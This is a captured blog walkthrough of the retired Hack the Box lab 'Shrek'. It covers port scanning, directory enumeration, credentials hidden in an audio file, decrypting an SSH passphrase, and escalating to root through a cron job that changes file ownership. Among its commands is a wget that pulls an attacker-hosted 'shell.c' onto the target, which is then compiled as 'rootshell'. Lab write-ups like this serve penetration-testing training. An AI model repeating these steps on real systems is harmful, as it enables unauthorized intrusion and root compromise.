@@ -1,0 +1,323 @@
+
+								
+																		Hack the Box Challenge: Shrek Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on April 6, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Shrek” which is available online for those who want to increase their skill in penetration testing and black box testing. Shrek is retired vulnerable lab presented by Hack the Box for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges from beginners to Expert level.
+Level: Intermediate
+Task: find user.txt and root.txt file on victim’s machine.
+Since these labs are online available therefore they have static IP and IP of sense is 10.10.10.47 so let’s begin with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -sV 10.10.10.47
+			
+				
+					
+				
+					1
+				
+						nmap -sV 10.10.10.47
+					
+				
+			
+		
+
+From given below image, you can observe we found port 21,22 and 80 are open in victim’s network.
+
+As we know from the nmap scan that the target machine is running HTTP on port 80, we open the Ip in our browser.
+
+We don’t find anything on the home page, so we use dirb to enumerate the directories.
+
+		
+		
+			
+			
+			
+			
+dirb http://10.10.10.47
+			
+				
+					
+				
+					1
+				
+						dirb http://10.10.10.47
+					
+				
+			
+		
+
+
+dirb scan shows a directory called uploads. We open uploads/ directory and find a file called secret_ultimate.php.
+
+Now we use wget to download the file into our system.
+
+		
+		
+			
+			
+			
+			
+wget http://10.10.10.47/uploads/secret_ultimate.php
+			
+				
+					
+				
+					1
+				
+						wget http://10.10.10.47/uploads/secret_ultimate.php
+					
+				
+			
+		
+
+
+We open secret_ultimate.php and find a path to a directory called secret_area_51.
+
+We open it in our browser and find an audio file in that directory.
+
+We download into our system and use an online site called academo.org to analyse the spectrum, we find a hint to log in through FTP using username donkey.
+
+Further analysis of the audio file gives us the password to the username.
+
+We login through FTP using the credentials we find in the audio file. After logging in we find a few text files and a file simply called key.
+
+We download the key and all the test files we use mget to mass-download the txt files.
+
+		
+		
+			
+			
+			
+			
+ftp&gt; get key
+ftp&gt; mget *.txt
+			
+				
+					
+				
+					12
+				
+						ftp&gt; get keyftp&gt; mget *.txt
+					
+				
+			
+		
+
+
+On our system as we can see all the files have been downloaded.
+
+We open the files one by one and in the highlighted file above we found a base64 encoded string that was differentiated by space.
+
+We decode the first base64 encoded string using hack bar and find the decoded string to be ‘PrinceCharming’
+
+In another file, we find a base64 encoded string similarly differentiated by space.
+
+We decode the base64 encoded string and find a hexadecimal encoded string.
+
+We use python to decode the hexadecimal string. We use seccure module and use ‘PrinceCharming’ as key to decode the string and find the ssh username and passphrase for the key
+
+		
+		
+			
+			
+			
+			
+import seccure
+string ="hexadecimal string"
+print seccure.decrypt(string, "PrinceCharming")
+			
+				
+					
+				
+					123
+				
+						import seccurestring ="hexadecimal string"print seccure.decrypt(string, "PrinceCharming")
+					
+				
+			
+		
+
+
+We open the key file and find that is a rsa key for ssh.
+
+We use this key to log in through using this rsa key. We use the username as sec as we found earlier and use the passphrase we found before to log in. As we log in we go to /home/sec directory, in that directory we find a file called user.txt. When we open the file we get our first flag.
+
+Going through the directories we find a file called thoughts.txt
+
+We create a file called raj in this directory.
+
+ 
+After a few minutes, we find that it changed to user and group of the file changed to root.
+
+Now to exploit the file we create a c program in our system that can give us the root.txt file in root directory. After creating the file we use SimpleHTTPServer module of python to transfer the file.
+
+We now download the file into the target system using wget.
+
+		
+		
+			
+			
+			
+			
+wget http://10.10.14.6:8000/shell.c
+			
+				
+					
+				
+					1
+				
+						wget http://10.10.14.6:8000/shell.c
+					
+				
+			
+		
+
+After downloading the file we compile the c program and save the compiled executable as rootshell.
+
+		
+		
+			
+			
+			
+			
+gcc shell.c -o rootshell
+			
+				
+					
+				
+					1
+				
+						gcc shell.c -o rootshell
+					
+				
+			
+		
+
+
+We now wait for the system to change the user and group of the file. As soon as it changes the user and group of the file we run it and find the final flag.
+
+ Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								Cinabro April 6, 2018 at 6:02 pm							
+							
+							
+														
+							
+								Another useful tutorial for who want approach the masochistic way of pentester 😀
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								Vishal Chaurasia October 12, 2018 at 8:47 am							
+							
+							
+														
+							
+								I loved this post!I read your blog fairty often and you’re
+always coming out with some great stuff. I shared this on my Facebook and my followers
+loved it!keep up the good work:)
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
